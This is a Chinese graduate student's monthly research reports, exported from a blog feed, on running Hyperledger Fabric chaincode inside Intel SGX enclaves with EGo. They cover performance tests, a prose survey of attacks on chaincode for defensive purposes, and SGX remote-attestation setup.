<h2 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h2><p>&emsp;&emsp;由于在自己虚拟机上没有sgx，使用仿真模式运行的，镜像中都没有安装sgx，所以可以成功。但在装配sgx的实机运行时发现镜像中也要安装sgx，运行失败。所以需要再挑选一个配备sgx的镜像或者在镜像中安装sgx，再进行运行测试。<br>&emsp;&emsp;在dockerhub上，有许多配备sgx的ubuntu镜像，单独运行sgx实例可以成功，但在安装ego后便报错，因此需要解决。<br>&emsp;&emsp;在单独的ubuntu镜像上安装sgx驱动时，linux-header中缺少一些文件，导致安装失败。</p>
<h2 id="下周工作计划"><a href="#下周工作计划" class="headerlink" title="下周工作计划"></a>下周工作计划</h2><ol>
<li>在docker镜像池中挑选sgx的镜像，或者在ubuntu镜像中安装sgx</li>
<li>根据fabric框架和ego框架，画出本工程的框架图</li>
<li>对该工程进行性能测试</li>
</ol>
<h2 id="个人反思"><a href="#个人反思" class="headerlink" title="个人反思"></a>个人反思</h2><p>&emsp;&emsp;到现在项目终于快完成了，接下来就是评估测试和调研攻击方法，写一篇完整的论文。时间也比较紧，要在12月底前将论文完成。<br>&emsp;&emsp;能够完成到这一步真的让我很开心，我马上联系了导师，希望能和她汇报一下。导师肯定了我的成果，提出了很多建议，导师也愿意把共同一作或者共同通讯作者给我。能得到赞赏总归是开心的，每次在和导师沟通后我都能开心很久，也有了继续的动力，尤其是这一切都是我踏踏实实做出来的，是我自己的努力。希望接下来能继续完成吧</p>
<h1 id="第二周-2021-11-08-–-2021-11-14"><a href="#第二周-2021-11-08-–-2021-11-14" class="headerlink" title="第二周 2021/11/08 – 2021/11/14"></a>第二周 2021/11/08 – 2021/11/14</h1><h2 id="本周工作情况和进展-1"><a href="#本周工作情况和进展-1" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h2><p>&emsp;&emsp;上周提出的镜像问题已经解决，在docker镜像池中找到了安装sgx的镜像，镜像中不能安装sgx驱动设备，需要将本机的sgx驱动传递到运行的镜像中。</p>
<p>&emsp;&emsp;本周简单画了几个原理图，还需要后续完善：</p>
<div align="center"><img src="/2021/12/01/2021%E5%B9%B411%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/7.png" width="500" height="287"></div>
<center style="font-size:16px;color:#000000f;text-decoration:underline">fabric原理图</center> 
<div align="center"><img src="/2021/12/01/2021%E5%B9%B411%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/8.png" width="500" height="215"></div>
<center style="font-size:16px;color:#000000f;text-decoration:underline">项目运行架构图</center> 
<div align="center"><img src="/2021/12/01/2021%E5%B9%B411%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/9.png" width="500" height="301"></div>
<center style="font-size:16px;color:#000000f;text-decoration:underline">静态原理图</center>

&emsp;&emsp;静态原理图太过于简单，直接就是在chaincode上套上chaincode，后续还需要重新改进。因为程序运行时会创建容器，所以运行图会凸显出容器之间的交互，更为详细，后续需要再添加一些细节。

&emsp;&emsp;本周对fabric的运行进行了简单评估。hyperledger下有一个caliper项目，专门用来测试区块链的性能，如延迟Latency、吞吐率Throughput、CPU占用率、内存等，如下：

<div align="center"><img src="/2021/12/01/2021%E5%B9%B411%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/10.png"></div>

<h2 id="存在的问题-1"><a href="#存在的问题-1" class="headerlink" title="存在的问题"></a>存在的问题</h2><p>&emsp;&emsp;该评估需要编写脚本来测试，因此后续可以测试创建、查询、修改账本的各种性能。<br>&emsp;&emsp;程序运行时间可以通过/usr/bin/time来获取链码安装、调用的时间信息。</p>
<h2 id="下周工作计划-1"><a href="#下周工作计划-1" class="headerlink" title="下周工作计划"></a>下周工作计划</h2><p>&emsp;&emsp;学习caliper使用方法，完善fabric性能测试。</p>
<h1 id="第三周-2021-11-15-–-2021-11-21"><a href="#第三周-2021-11-15-–-2021-11-21" class="headerlink" title="第三周 2021/11/15 – 2021/11/21"></a>第三周 2021/11/15 – 2021/11/21</h1><h2 id="本周工作情况和进展-2"><a href="#本周工作情况和进展-2" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h2><ol>
<li><p>改进框架图</p>
<div align="center"><img src="/2021/12/01/2021%E5%B9%B411%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/11.png"></div>
<div align="center"><img src="/2021/12/01/2021%E5%B9%B411%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/12.png"></div>
</li>
<li><p>评估问题解决<br>&emsp;&emsp;上周提到修改的区块数目过大时，出现读写冲突。该问题与fabric机制和链码编写有关，fabric会汇总一定数量的区块再一起提交，当多个区块键值状态相同时，就会出现冲突。因此fabric官方提供了一个高吞吐率的链码，使用该链码就不会有读写冲突。</p>
</li>
<li><p>评估结果<br>&emsp;&emsp;评估对象是随着客户端数目的增加Latency延迟、Throughput吞吐率的变化。<br>&emsp;&emsp;使用fabric官方的高吞吐率链码和caliper工具，编写读取和修改两种脚本。读取调用链码后直接返回结果，不经过orderer节点分发，不写入账本。修改数据时要调用链码，由orderer节点广播，写入到各peer节点的账本中。因此读取的效率明显高一些，吞吐率高于写入，延迟低于写入操作。<br>&emsp;&emsp;这里从一个客户端开始，以倍数增加，最多128个客户端，对比fabric原网络和使用sgx的网络。在测试时有一个现象，如果在一个持续的网络中测试，客户端数目不变时，吞吐率会持续下降，因此每次修改客户端数目时，我会将网络重启，保证得到最优的吞吐率。结果如下图：（读取使用左纵坐标轴，写入使用右纵坐标轴）</p>
<div align="center"><img src="/2021/12/01/2021%E5%B9%B411%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/13.png"></div>
<div align="center"><img src="/2021/12/01/2021%E5%B9%B411%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/14.png"></div>
  综合上图所知，两种网络的趋势是相同的，延迟和吞吐率相差不大。因为每一次测试数据都有波动，所以看不出明显的区分关系。但这个结果和预想的有一些差距，随着客户端数目增加，延迟应该是逐步增加的，而第一个图128个客户端读取时延迟骤降，比较反常。吞吐率应该先增加，达到最优值后降低，读取测试满足，但写入测试时有一个先降再升再降的过程，也不符合。
  下图是另一篇论文中作者的测试图，也是客户端由1增加到128，整体规律就很明了，并且明显有sgx的效率会低一些，而我的测试关系不明显。
<div align="center"><img src="/2021/12/01/2021%E5%B9%B411%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/15.png"></div>

</li>
</ol>
<h2 id="存在的问题-2"><a href="#存在的问题-2" class="headerlink" title="存在的问题"></a>存在的问题</h2><p>&emsp;&emsp;测试图规律不明显，并且不能很好地展现出结果，需要进一步测试修改。</p>
<h2 id="下周工作计划-2"><a href="#下周工作计划-2" class="headerlink" title="下周工作计划"></a>下周工作计划</h2><p>&emsp;&emsp;继续使用caliper测试结果</p>
<h1 id="第四周-2021-11-22-–-2021-11-28"><a href="#第四周-2021-11-22-–-2021-11-28" class="headerlink" title="第四周 2021/11/22 – 2021/11/28"></a>第四周 2021/11/22 – 2021/11/28</h1><h2 id="本周工作情况和进展-3"><a href="#本周工作情况和进展-3" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h2><ol>
<li><p>扩大测试组数，修改绘图<br>&emsp;&emsp;上周各组数据均测试一次，因此数据浮动较大，为减少误差，随着客户端倍数增加，每次测试四组数据，取平均值，减少数据浮动误差。<br>&emsp;&emsp;针对ppt绘图不美观的问题，本次使用python绘图，并将query和update分别绘图，如下：</p>
<div align="center"><img src="/2021/12/01/2021%E5%B9%B411%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/16.png"></div>
<div align="center"><img src="/2021/12/01/2021%E5%B9%B411%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/17.png"></div>
<div align="center"><img src="/2021/12/01/2021%E5%B9%B411%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/18.png"></div>
<div align="center"><img src="/2021/12/01/2021%E5%B9%B411%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/19.png"></div>
</li>
<li><p>攻击方向调研<br>&emsp;&emsp;SGUARD: Towards Fixing Vulnerable Smart Contracts Automatically<br>&emsp;&emsp;EOSAFE: Security Analysis of EOSIO Smart Contracts<br>&emsp;&emsp;老师发的两篇文章均是针对代码的，检测代码漏洞或者执行漏洞，如缓冲区溢出等，然后对代码或者二进制程序进行补丁修改。我们的工作是直接将链码放入enclave中运行，因此针对链码自身的漏洞应该是无法防御的。但两篇论文提了一个很好的思路，在原架构的基础上，可以在enclave中嵌入修复模块，对链码本身先检测修复，然后再运行，对链码进行两层保护。<br>&emsp;&emsp;目前针对智能合约的攻击大多是从代码层面，如伪随机数发生器、查询、全局变量漏洞等。enclave只能保护运行时安全，防止运行程序的状态、功能被窃取，因此不知道能否防御代码层面的攻击。针对enclave的这一特点，我的想法是寻找窃取chaincode信息或攻击运行时程序的攻击来调研。<br>&emsp;&emsp;其次，很多论文也有针对账本（ledger）来保护，将数据放入enclave中保护完整性，项目后续也可以考虑该方法。</p>
</li>
</ol>
<h2 id="下周工作计划-3"><a href="#下周工作计划-3" class="headerlink" title="下周工作计划"></a>下周工作计划</h2><p>&emsp;&emsp;以针对窃取链码各种信息、状态的攻击或者针对账本的攻击来调研。</p>]]></content>
      <categories>
        <category>科研周报</category>
      </categories>
      <tags>
        <tag>Hyperledger Fabric</tag>
        <tag>SGX</tag>
        <tag>EGo</tag>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>2021年9月科研月报</title>
    <url>/2021/09/30/2021%E5%B9%B49%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/</url>
    <content><![CDATA[<!-- excerpt -->
<!-- toc -->
<h1 id="本学期的科研计划"><a href="#本学期的科研计划" class="headerlink" title="本学期的科研计划"></a>本学期的科研计划</h1><p>&emsp;&emsp;本学期的科研项目为使用SGX保护hyperledger-fabric区块链，目前已经成功部署fabric网络和SGX，对二者进行测试使用。<br>&emsp;&emsp;初步计划在年底前实现简单地将chaincode放入SGX的enclave中运行（在fabric中称为链码chaincode，等同于其他区块链中的智能合约Smart contract）。为实现该想法，首先需要打通fabric链码由go语言编写和SGX由C语言编写的限制，通过阅读ego的实现方法，模拟ego，为go语言编写的chaincode创造enclave，保护其运行。<br>&emsp;&emsp;在上述计划完成后，分析多种针对fabric的攻击方式，目前已经调研了Sybil攻击、Rollback攻击，改进以上方案，抵御至少一种攻击行为。</p>
<h1 id="本周工作情况和进展"><a href="#本周工作情况和进展" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h1><ol>
<li><p>chaincode是如何安装和运行的?<br>&emsp;&emsp;在fabric中，chaincode是通过如下命令安装到网络中的：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">peer lifecycle chaincode install mycc.tar.gz</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;其中peer是fabric操作的指令，mycc.tar.gz就是chaincode的压缩包，其中包含一个json文件和go文件。<br>&emsp;&emsp;在安装后，peer实例化该chaincode时，peer命令会创建一个docker文件，为chaincode创建容器，编译go文件，并将编译后的二进制文件放入容器中运行。之后peer便会通过chaincode中的接口（Init、Invoke、Query）来与之交互。<br><br></p>
</li>
<li><p>EGo<br>&emsp;&emsp;ego官网：<a href="https://docs.edgeless.systems/ego/#/">https://docs.edgeless.systems/ego/#/</a><br>&emsp;&emsp;ego-go，一个经过改进的Go编译器，可以从给定的Go项目中构建与enclave兼容的可执行文件——同时提供与原始Go编译器相同的CLI。<br>&emsp;&emsp;ego，一个CLI工具，可以处理所有与enclave相关的任务，如签名和创建enclave。<br>&emsp;&emsp;ego使用如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ego-go build helloworld.go  //编译一个go程序</span><br><span class="line">ego sign helloworld         //创建enclave.json配置文件和公私密钥对</span><br><span class="line">ego run helloworld          //在enclave中运行（此处是在仿真模式运行）</span><br></pre></td></tr></table></figure>
<p><div align="center"><img src="/2021/09/30/2021%E5%B9%B49%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/ego.png"></div><br><br></p>
</li>
<li><p>针对fabric提出三种方案<br>&emsp;&emsp;A方案：<br>&emsp;&emsp;使用ego，设法在运行时替换go为ego，并使用ego run运行chaincode。<br>&emsp;&emsp;问题：chaincode不是独立的运行程序，需要与peer程序交互，因此无法直接使用ego run运行。<br><br>&emsp;&emsp;B方案：<br>&emsp;&emsp;自己编写chaincode，将chaincode划分为两部分，交互的接口部分使用go语言编写，实际运行部分使用c语言编写，并启动enclave运行。<br>&emsp;&emsp;问题：go语言如何与C语言交互？go程序会被peer编译，c语言如何被fabric编译运行？并且该方案也不实用，用户每次都需要重新编写chaincode。<br><br>&emsp;&emsp;C方案：<br>&emsp;&emsp;阅读ego源码，模仿ego为go程序创建enclave功能的实现，在网络中直接为chaincode创建enclave。<br>&emsp;&emsp;该方案较为实用，用户只需要和之前一样编写go语言的chaincode即可。难点在于ego源码的阅读和实现。</p>
</li>
</ol>
<h1 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h1><ol>
<li><p>源码理解问题<br>&emsp;&emsp;fabric源码、sgx实现方法、ego源码均需要时间去理解，fabric源码量较大，因此可以选择chaincode的部分先着重分析。而网络中关于ego的解释文件很少，官网也只是粗略地介绍使用方法，因此源码阅读很有难度，只能通过cmakefile来理清文件结构。同时fabric都是使用go语言编写，我未系统地学习go语言，因此也需要花时间了解go语法。</p>
</li>
<li><p>二者交互问题<br>&emsp;&emsp;整个科研方案最大的问题就是go语言和c语言的结合问题，fabric只支持go语言，sgx只能通过C语言编写，因此将二者结合就是一个难点。目前还没有较好的解决方案。</p>
</li>
</ol>
<h1 id="下周工作计划"><a href="#下周工作计划" class="headerlink" title="下周工作计划"></a>下周工作计划</h1><ol>
<li>继续ego源码阅读</li>
<li>sgx相关文件阅读，并充分学会编写sgx程序</li>
<li>尝试编写go语言的enclave代码（模仿ego）（可能需要多周实现）</li>
</ol>]]></content>
      <categories>
        <category>科研周报</category>
      </categories>
      <tags>
        <tag>Hyperledger Fabric</tag>
        <tag>SGX</tag>
        <tag>EGo</tag>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>2021年12月科研月报</title>
    <url>/2022/01/01/2021%E5%B9%B412%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/</url>
    <content><![CDATA[<!-- excerpt -->
<!-- toc -->
<h1 id="本学期科研规划"><a href="#本学期科研规划" class="headerlink" title="本学期科研规划"></a>本学期科研规划</h1><p>&emsp;&emsp;在fabric区块链中使用sgx技术，将chaincode放入enclave中运行，保护智能合约运行安全。</p>
<h1 id="本月规划"><a href="#本月规划" class="headerlink" title="本月规划"></a>本月规划</h1><p>&emsp;&emsp;调研针对fabric链码的攻击方法，并进行防御测试，15日前完成调研工作。月底前完成整体论文。</p>
<h1 id="第一周-2021-11-29-–-2021-12-05"><a href="#第一周-2021-11-29-–-2021-12-05" class="headerlink" title="第一周 2021/11/29 – 2021/12/05"></a>第一周 2021/11/29 – 2021/12/05</h1><h2 id="本周工作情况和进展"><a href="#本周工作情况和进展" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h2><ol>
<li><p>链码修复工具<br>&emsp;&emsp;上周调研后发现，针对链码的攻击都是从代码漏洞出发的，如全局变量、恶意跳转等。像以太坊、比特币的智能合约攻击也都是从代码编写层面考虑的，因此在阅读相关论文后，想添加一个自动修复fabric链码的功能。<br>&emsp;&emsp;调研后发现fabric有revive^CC这个静态分析工具，只能对源码进行漏洞检测，会检查全局变量、多线程、随机数使用、读写冲突等情况，如下图：<br><div align="center"><img src="/2022/01/01/2021%E5%B9%B412%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/1.png"></div><br>&emsp;&emsp;但该工具只是对源码进行检测，不能直接对可执行程序打补丁，所以不能直接用于我们的系统。</p>
</li>
<li><p>fabric可视化<br>&emsp;&emsp;因为要对链码进行攻击，使用终端查看很不方便，因此我想将fabric可视化，更直观地查看区块和交易情况。和之前测试工具caliper一样，Hyperledger社区内也有可视化工具。<br>&emsp;&emsp;Hyperledger Explorer是一个简单，功能强大，易于使用，高度可维护的开源区块链浏览器，用于查看底层区块链网络上的活动。<br>&emsp;&emsp;通过explorer可以看到网络中的区块信息和交易内容，使用后界面如下：</p>
<div align="center"><img src="/2022/01/01/2021%E5%B9%B412%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/2.png"></div>
</li>
<li><p>sgx可视化<br>&emsp;&emsp;在思考fabric可视化后，考虑到攻击enclave中的链码，需要能够“看到”enclave，因此搜索了enclave的可视化方法，找到了sgxtop项目，它可以列出enclave数目、整体enclave内存使用、分页速率和正在使用的enclave，以及它们的内存使用情况和所属进程的信息。<br>&emsp;&emsp;因为该项目需要卸载原有的isgx driver，安装适配sgxtop的sgx驱动，因此我还没有在自己电脑上测试，官方的测试效果如下：</p>
<div align="center"><img src="/2022/01/01/2021%E5%B9%B412%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/3.png"></div>
</li>
<li><p>针对链码的攻击面<br>&emsp;&emsp;阅读使用sgx保护fabric相关论文和参考文献后，提到比较多的工作如下：<br>[1] The Hyperledger Private Data Objects (PDOs)（Private Data Objects: an Overview）<br>[2] Ekiden（Ekiden: A Platform for Confidentiality-Preserving, Trustworthy, and Performant Smart Contracts）<br>[3] The R3 Corda distributed ledger platform（Corda: A distributed ledger）<br>[4] Hawk（Hawk: The Blockchain Model of Cryptography and Privacy-Preserving Smart Contracts）<br>[5] Coco framework（CCF: A Framework for Building Confidential Verifiable Replicated Services）<br>&emsp;&emsp;这几篇论文都是与TEE或者sgx相关的，但都没有提到攻击方式，反倒是重点讲述隐私问题，以保护区块链、链码隐私开题，然后介绍加强执行过程的隐私保护。<br>&emsp;&emsp;如：区块链数据是公开的。因此，现有的智能合约系统缺乏保密性或隐私性:它们无法安全地存储或计算敏感数据(例如，拍卖出价、金融交易)。<br>&emsp;&emsp;因此我觉得找不到一个具体的攻击方法。这几篇论文倒是可以放到一起对比，然后写入related work部分。<br>&emsp;&emsp;在调研过程中我发现了一篇浙江大学的硕士论文（基于区块链和TEE的可信计算平台设计与开发_钟雨涵），该论文和我们工作方向一致，并且作者是完全使用C语言编写sgx部分，使用cgo来与fabric链码go语言部分交互的，和之前提出的想法一样。而我们的工作与之相比就过于简单，所以画不出与他一样的框架图。该论文也没有提到攻击方法。</p>
</li>
</ol>
<h2 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h2><p>&emsp;&emsp;找不到与之相关的攻击方法，我觉得还是需要从隐私和执行保护入手。</p>
<h2 id="下周工作计划"><a href="#下周工作计划" class="headerlink" title="下周工作计划"></a>下周工作计划</h2><p>&emsp;&emsp;阅读上述五篇相关论文，写一篇方法对比报告。（准备毕业开题答辩ppt）</p>
<h1 id="第二周-2021-12-06-–-2021-12-12"><a href="#第二周-2021-12-06-–-2021-12-12" class="headerlink" title="第二周 2021/12/06 – 2021/12/12"></a>第二周 2021/12/06 – 2021/12/12</h1><h2 id="本周工作情况和进展-1"><a href="#本周工作情况和进展-1" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h2><p>&emsp;&emsp;因为上周调研工作不太完善，并且也没有总结好，本周继续进行攻击调研。</p>
<ol>
<li><p>sgx防护功能<br>&emsp;&emsp;在攻击前先理清sgx防护功能。sgx保护enclave中的程序不被窃取、攻击，而智能合约代码是公开的，即智能合约运行的功能是已知的，sgx可以保护链码运行，保护运行中的计算过程不被窃取。而如果代码出现漏洞，恶意用户依然可以向enclave传入数据来触发漏洞。</p>
</li>
<li><p>fabric和以太坊的区别<br>&emsp;&emsp;在阐述攻击方法前，有必要先了解不同区块链的区别，因为有的攻击是针对特定区块链的，不具有通用性。<br>1) 运行模式<br>&emsp;&emsp;以太坊是公有链，fabric是私有链，因此fabric本身就更为安全，任何节点加入都需要批准，许多攻击无法进入fabric网络，并且恶意用户可以快速溯源。<br>2) 货币<br>&emsp;&emsp;以太坊上有加密货币Ether，执行智能合约也伴随有花费（gas），所以以太坊有算力的概念，而fabric是没有加密货币的。因此许多由算力、花费而带来的攻击并不适用于fabric，如51%攻击、双花攻击。 fabric共识机制不是采用POW算法，而是到order里排队处理，没有算力占优就可以决定链的现象。<br>3) 运行环境<br>&emsp;&emsp;以太坊运行在虚拟机（EVM）中，fabric节点运行在docker容器中，docker容器本身比虚拟机安全性更高。<br>4) 智能合约语言<br>&emsp;&emsp;以太坊是使用的solidity，fabric使用的是go语言（也支持java、nodejs）。编程语言类的漏洞也存在一些差异。</p>
</li>
<li><p>代码漏洞<br>&emsp;&emsp;此类漏洞是最常见的，去网上搜索智能合约漏洞，大多都是代码编写漏洞。针对fabric的代码漏洞有以下几类：<br>1) Time库<br>&emsp;&emsp;如果链码中有获取当前时间戳的操作，不同节点执行时就会产生差异。<br>2) 全局变量<br>&emsp;&emsp;fabric中是先执行链码，再进行背书，如果背书是需要两个节点的同意，但我只向一个节点发送请求，背书会失败，此时链码已经执行一次。那么该节点全局变量会发生变化，与其他节点的数值便不一致。<br>3) 多线程<br>4) 先写后读<br>&emsp;&emsp;如果在一个操作中先改变账本的数值，然后又读取同一个值。因为是在同一个操作中，就会放入一个区块，产生读写冲突。<br>&emsp;&emsp;总结来说代码漏洞层面的攻击很多，而且需要针对特定的功能。此类攻击无法防御，因为我们只是为链码创造可信执行环境，存在漏洞的代码依然会在enclave中执行，那么恶意用户便可以传入恶意构造数值，达到攻击。</p>
</li>
<li><p>DoS攻击<br>&emsp;&emsp;智能合约的状态改变依赖于外部函数执行的结果，又未对执行一直失败的情况做出防护，那么该智能合约就可能遭受DOS攻击而停止服务。<br>&emsp;&emsp;垃圾流量占据整个区块链网络。用户的密钥被泄露，攻击者开始向网络发送大量事务垃圾邮件。<br>&emsp;&emsp;此类攻击和代码或者网络相关，我认为也是无法防御的。</p>
</li>
<li><p>重入攻击<br>&emsp;&emsp;攻击者编写了对应的恶意智能合约，调用受害者的合约，同时利用自己的回调函数，循环地调用受害者合约的代码。由于是重复进入受害者合约执行对应的一段代码导致漏洞。如下图：<br><div align="center"><img src="/2022/01/01/2021%E5%B9%B412%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/4.png"></div><br>&emsp;&emsp;此类漏洞主要发生在以太坊中，以太坊在花费后有回调函数，容易触发。而Fabric作为私有链，安装链码需要批准，用户可以设置各种批准策略，因此难度更高。如果恶意链码可以安装，我们的sgx也无法防御，enclave中的合约调用外部函数依然会触发重入。</p>
</li>
<li><p>回滚攻击<br>&emsp;&emsp;攻击者得到最终区块结果后，回滚到之前的状态，调整输入，创造新的有利结果如：在得到彩票结果后，回滚到未开奖状态，重新下注。这种攻击资料较少，不知道利用什么漏洞来触发回滚。假设可以触发攻击，sgx本身就容易受到回滚攻击，sgx不对输入输出进行检查，只是安全执行，因此无法防御该漏洞。</p>
</li>
<li><p>隐私问题<br>&emsp;&emsp;目前所有关于TEE保护sgx的论文都是以保护智能合约隐私为目的。区块链数据是公开的。因此，现有的智能合约系统缺乏保密性或隐私性:它们无法安全地存储或计算敏感数据(例如，拍卖出价、金融交易)。<br>&emsp;&emsp;Sgx保护三种数据：<br>&emsp;&emsp;静态数据：直接获取的数据（如数据库、账本）<br>&emsp;&emsp;传递数据：传递在网络中的数据（节点间信息传递）<br>&emsp;&emsp;运行数据：运行的程序代码，参与计算（运行中的链码）<br>&emsp;&emsp;sgx可以对以上三种情况进行保护，也是所有关于sgx保护区块链论文所讨论强调的问题。我们的项目可以保护运行中的数据。</p>
</li>
<li><p>链码网络安全问题（该问题来源于fabric1.0版本）<br>1) 窃听:通过欺骗GRPC连接和观察事务调用以及提议响应而实现。<br>2) peer假冒攻击:这可以通过改变链码进程的配置，诱使它连接到一个假装是peer的恶意进程来实现。<br>3) 链码假冒攻击:这可以通过诱使对等端相信所连接的进程是一个合法的链码，但实际上它是一个恶意进程来实现。<br>&emsp;&emsp;我们可以添加远程认证，当链码在enclave中运行后向peer节点发送证明，证明自己在可信环境中，那么就可以防御链码假冒攻击，因为假冒的链码无法提供该证明。</p>
</li>
<li><p>容器安全问题（攻击权限要求较高）（来源于2020年论文）<br>&emsp;&emsp;容器安全问题来源于2020年发表的论文：Perturbing Smart Contract Execution Through the Underlying Runtime，是针对fabric运行环境docker容器提出的。<br>1) 不安全通信和中间人攻击<br>&emsp;&emsp;Peer和chaincode采取grpc通信，通信信息经过tls加密，但加密密钥等信息都存储在容器内。<br><div align="center"><img src="/2022/01/01/2021%E5%B9%B412%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/5.png"></div><br><div align="center"><img src="/2022/01/01/2021%E5%B9%B412%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/6.png"></div><br>&emsp;&emsp;那么就存在中间人，在容器中获取信息后使用密钥解密信息，从而窃取二者的通信信息，甚至可以篡改。此类攻击我们无法防御。<br>2) 镜像替换<br>&emsp;&emsp;ccenv镜像：编译链码     baseos镜像：运行链码<br>&emsp;&emsp;Fabric运行容器时只注意镜像标签tag，而不是镜像的哈希值，恶意用户可以用自己的恶意镜像打上标签，伪装成baseos镜像，从而使智能合约运行在恶意镜像中。此类攻击我认为可以防御，同样使用远程认证，被替换后的镜像无法提供远程认证，因此不被peer节点连接。<br><div align="center"><img src="/2022/01/01/2021%E5%B9%B412%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/7.png"></div><br>&emsp;&emsp;这两个攻击是基于fabric运行的环境提出的，对攻击者的权限要求较高，比如拿到主机权限或者可以访问容器。<br>&emsp;&emsp;总结来说，我认为可以防御的攻击有链码假冒攻击和容器替换攻击，同时我们的方法也可以加强智能合约执行的隐私性。</p>
</li>
</ol>
<h2 id="存在的问题-1"><a href="#存在的问题-1" class="headerlink" title="存在的问题"></a>存在的问题</h2><p>&emsp;&emsp;初步尝试替换链码进行攻击，替换后节点无法连接上新链码，导致无法处理新的智能合约运算。所有说简单替换是不行的。找不到与之相关的攻击方法，我觉得还是需要从隐私和执行保护入手。</p>
<h2 id="下周工作计划-1"><a href="#下周工作计划-1" class="headerlink" title="下周工作计划"></a>下周工作计划</h2><p>&emsp;&emsp;完善攻击方法，尽可能实现上述两种攻击。<br>&emsp;&emsp;添加远程认证功能。</p>
<h1 id="第三周-2021-12-13-–-2021-12-19"><a href="#第三周-2021-12-13-–-2021-12-19" class="headerlink" title="第三周 2021/12/13 – 2021/12/19"></a>第三周 2021/12/13 – 2021/12/19</h1><h2 id="本周工作情况和进展-2"><a href="#本周工作情况和进展-2" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h2><p>&emsp;&emsp;本周尝试使用SGX远程认证，SGX提供两种认证方式：<br>&emsp;&emsp;Elliptic Curve Digital Signature Algorithm (ECDSA) Attestation<br>&emsp;&emsp;Intel® Enhanced Privacy ID (Intel® EPID) Attestation<br>&emsp;&emsp;ECDSA：通过Intel® Software Guard Extensions Data Center Attestation Primitives (Intel® SGX DCAP)实现第三方认证，允许用户构建他们自己的认证服务，而不是使用Intel提供的远程认证服务。该认证需要机器满足Intel SGX DCAP的安装要求，需要支持flexible launch control和AES新指令。<br>&emsp;&emsp;EPID：在不知道enclave运行在何种Intel®处理器的情况下验证enclave。使用这种技术需要一个远程认证平台，并且平台需要有互联网接入。<br>&emsp;&emsp;两种认证方式对应两个不同的sgx驱动，因此也对应两种intel处理器，支持FLC和不支持的。<br>&emsp;&emsp;ego也内置了认证方式，但是ego的认证是基于ECDSA的本地认证，因此使用了ego就不能使用EPID认证。<br>&emsp;&emsp;优先还是选择ECDSA认证方式，不需要IAS（intel认证服务）注册，本地搭建认证服务，更为实用。</p>
<h2 id="存在的问题-2"><a href="#存在的问题-2" class="headerlink" title="存在的问题"></a>存在的问题</h2><p>&emsp;&emsp;实验室机器原本安装的是EPID版本的sgx驱动，因此跑不通远程认证，现在正在重新安装DCAP和ECDSA的驱动，遇到一些安装问题。</p>
<h2 id="下周工作计划-2"><a href="#下周工作计划-2" class="headerlink" title="下周工作计划"></a>下周工作计划</h2><p>&emsp;&emsp;先解决sgx驱动安装问题，测试sgx的远程认证功能，再集成到fabric的框架中。<br>&emsp;&emsp;绘制新的多enclave框架图。</p>
<h1 id="第四周-2021-12-20-–-2021-12-26"><a href="#第四周-2021-12-20-–-2021-12-26" class="headerlink" title="第四周 2021/12/20 – 2021/12/26"></a>第四周 2021/12/20 – 2021/12/26</h1><h2 id="本周工作情况和进展-3"><a href="#本周工作情况和进展-3" class="headerlink" title="本周工作情况和进展"></a>本周工作情况和进展</h2><p>&emsp;&emsp;在上周的基础上，本周重新安装了sgx驱动和PCCS（Provisioning Certificate Caching Service）配置证书缓存服务。PCCS就相当于本地的认证服务，可以提供根证书、tcb等信息，如访问pccs服务获取tcb信息：</p>
<div align="center"><img src="/2022/01/01/2021%E5%B9%B412%E6%9C%88%E7%A7%91%E7%A0%94%E6%9C%88%E6%8A%A5/8.png"></div>

<p>&emsp;&emsp;pccs就是一个在线服务器，如上图网址<a href="https://localhost:8081/sgx/certification/v3/，传入tcb获取信息，也可以获取根证书等。">https://localhost:8081/sgx/certification/v3/，传入tcb获取信息，也可以获取根证书等。</a><br>&emsp;&emsp;运行sgx的远程认证案例成功：</p>
